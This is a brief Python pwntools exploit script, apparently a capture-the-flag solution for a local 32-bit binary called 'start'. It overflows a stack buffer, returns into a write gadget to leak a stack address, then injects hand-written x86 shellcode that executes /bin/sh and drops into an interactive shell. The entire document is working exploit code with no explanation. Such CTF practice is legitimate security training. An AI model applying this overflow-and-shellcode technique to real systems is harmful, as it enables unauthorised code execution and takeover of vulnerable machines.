from pwn import *
context.log_level = "debug"
p = process("./start")

write = 0x8048087
p1  = "A"*20+p32(write)
pause()

p.sendafter(":",p1)
stack_addr = u32(p.recv(4))
sh = asm("""
        push 0x68
        push 0x732f2f2f
        push 0x6e69622f
        mov ebx, esp
        xor ecx, ecx
        xor edx, edx
        push 11
        pop eax
        int 0x80
""")
print hex(stack_addr)
p2 = "A"*20+p32(stack_addr+0x14)+sh
p.sendline(p2)

p.interactive()

